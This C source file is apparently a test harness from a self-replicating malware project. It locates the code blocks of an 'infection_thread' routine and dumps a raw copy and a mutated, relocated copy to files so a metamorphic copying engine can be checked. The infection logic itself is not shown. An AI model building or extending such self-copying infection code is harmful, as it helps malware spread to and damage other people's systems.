#undef NDEBUG
#include <assert.h>
#include <stdio.h>

#include "block/copy.h"
#include "block/discovery.h"
#include "code_begin.h"
#include "code_end.h"
#include "infection_thread.h"
#include "utility.h"

void memdump(void *addr, size_t size, const char *filename) {
    FILE *f = fopen(filename, "w");
    if (f != NULL) {
        fwrite(addr, 1, size, f);
        fclose(f);
    }
}

bool write_raw_code_copy(void **entrypoints, const char *filename) {
    BlockList *blocks = discover_blocks(entrypoints, code_begin, code_end);
    if (blocks == NULL) {
        PRINT_DEBUG("Could not discover blocks");
        return false;
    }
    size_t size = get_code_size(blocks);
    assert(size > 0);
    void *raw_mem = malloc(size);
    assert(raw_mem != NULL);
    if (!copy_blocks_test(blocks, raw_mem, size)) {
        PRINT_DEBUG("Could not copy unmodified blocks");
        return false;
    }

    memdump(raw_mem, size, filename);

    free(raw_mem);
    free_block_list(blocks);
    return true;
}

bool write_modified_code_copy(void **entrypoints, const char *filename) {
    BlockList *blocks = discover_blocks(entrypoints, code_begin, code_end);
    if (blocks == NULL) {
        PRINT_DEBUG("Could not discover blocks");
        return false;
    }

    size_t target_size = estimate_target_code_size(blocks);
    assert(target_size > 0);
    PRINT_DEBUG("Target code size estimate = %.1fkB",
                (float)target_size / 1024.);

    PRINT_DEBUG("Allocating target memory");
    void *target_mem = malloc(target_size);
    assert(target_mem != NULL);
    PRINT_DEBUG("Target base is %p", target_mem);

    void *dest_entrypoint =
        copy_blocks(blocks, entrypoints[0], target_mem, target_size);
    if (dest_entrypoint == NULL) {
        PRINT_DEBUG("Could not copy modified blocks");
        return false;
    }
    PRINT_DEBUG("Target entry point is %p", dest_entrypoint);

    memdump(target_mem, target_size, filename);

    free(target_mem);
    free_block_list(blocks);
    return true;
}

int main(int argc, char **argv) {
    void *entrypoints[] = {(void *)spawn_infection_thread,
                           (void *)infection_thread, NULL};

    if (argc != 3) {
        PRINT_DEBUG("Need two paths for binary output");
        return 1;
    }

    if (!write_raw_code_copy(entrypoints, argv[1])) {
        PRINT_DEBUG("Could not write unmodified code copy");
        return 1;
    }
    if (!write_modified_code_copy(entrypoints, argv[2])) {
        PRINT_DEBUG("Could not write modified code copy");
        return 1;
    }

    return 0;
}
